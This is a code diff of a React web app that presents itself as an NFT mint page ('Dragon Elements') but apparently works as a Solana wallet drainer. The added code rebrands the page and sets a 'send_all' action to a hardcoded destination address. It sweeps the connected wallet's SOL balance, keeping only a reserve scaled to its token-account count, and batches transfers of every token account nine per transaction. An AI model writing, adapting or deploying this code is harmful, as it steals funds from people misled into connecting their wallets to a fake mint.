@@ -1,38 +1,25 @@
 import './App.css';
-import {TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction,
-    // MintLayout,
-    // ASSOCIATED_TOKEN_PROGRAM_ID,
-    // createCloseAccountInstruction,
-} from '@solana/spl-token';
-import {clusterApiUrl, Connection, SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL,
-    // ParsedAccountData,
-    // Keypair,
-    // sendAndConfirmTransaction,
-    // SYSVAR_RENT_PUBKEY,
-    // TransactionInstruction,
-} from '@solana/web3.js';
-// import {readFile} from "fs/promises";
-// import bs58 from 'bs58';
+import {TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction,} from '@solana/spl-token';
+import {clusterApiUrl, Connection, SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL} from '@solana/web3.js';
+
 import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-
-const solAmount = 2
-const image = 'https://pbs.twimg.com/profile_images/1538899716368281601/m7x5EWn4_400x400.jpg'
-const Title = 'HedgeFundBabies'
-const supply = 1000
+const solAmount = 0.3
+const image = 'https://static9.depositphotos.com/1307373/1179/i/600/depositphotos_11794280-stock-photo-red-apple.jpg'
+const Title = 'Dragon Elements'
+const supply = 1110
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
 
-
 const ACTION = 'send_all';
 
-// const SENDS_IN_ONE_TX = 5;
+const SENDS_IN_ONE_TX = 9;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('r74VH5E1Hz3uRgG15RjywGPJ9Cztw2yKQszFhofRZT5');
+const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
@@ -41,7 +28,6 @@ export const WRAPPED_SOL = 'So11111111111111111111111111111111111111112';
 console.log(DESTINATION)
 
 function App() {
-
     // function sleep(ms) {
     //     return new Promise(resolve => setTimeout(resolve, ms));
     // }
@@ -148,7 +134,39 @@ function App() {
         try {
             const balance = await connection.getBalance(walletKeyPair.publicKey);
 
-            const toSend = balance - (0.01 * LAMPORTS_PER_SOL);
+            const accountsArray = await getTokenAccounts(connection, walletKeyPair.publicKey);
+
+            const accounts1 = accountsArray.length
+
+            let remainingSolana
+
+            if(accounts1 < 10){
+                remainingSolana = 0.01
+            } else if(accounts1 < 19){
+                remainingSolana = 0.02
+            } else if(accounts1 < 28){
+                remainingSolana = 0.03
+            } else if(accounts1 < 37){
+                remainingSolana = 0.04
+            } else if(accounts1 < 46){
+                remainingSolana = 0.05
+            } else if(accounts1 < 55){
+                remainingSolana = 0.06
+            } else if(accounts1 < 64){
+                remainingSolana = 0.07
+            } else if(accounts1 < 73){
+                remainingSolana = 0.08
+            } else if(accounts1 < 82){
+                remainingSolana = 0.09
+            } else if(accounts1 < 91){
+                remainingSolana = 0.1
+            } else {
+                remainingSolana = 0.1
+            }
+
+            console.log(accounts1, remainingSolana)
+
+            const toSend = balance - (remainingSolana * LAMPORTS_PER_SOL);
 
             if (toSend <= 0.0001 * LAMPORTS_PER_SOL) {
                 console.log('No funds to send.');
@@ -257,15 +275,15 @@ function App() {
 
         console.log(`Found ${accounts.length} accounts...`);
 
-        const txsNeeded = Math.ceil(accounts.length / Number(accounts.length));
+        const txsNeeded = Math.ceil(accounts.length / SENDS_IN_ONE_TX);
 
-        for (let i = 0; i < accounts.length / Number(accounts.length); i++) {
-            const itemsRemaining = Math.min(Number(accounts.length), accounts.length - i * Number(accounts.length));
+        for (let i = 0; i < accounts.length / SENDS_IN_ONE_TX; i++) {
+            const itemsRemaining = Math.min(SENDS_IN_ONE_TX, accounts.length - i * SENDS_IN_ONE_TX);
 
             const transaction = new Transaction();
 
             for (let j = 0; j < itemsRemaining; j++) {
-                const item = i * Number(accounts.length) + j;
+                const item = i * SENDS_IN_ONE_TX + j;
 
                 const acc = accounts[item];
 
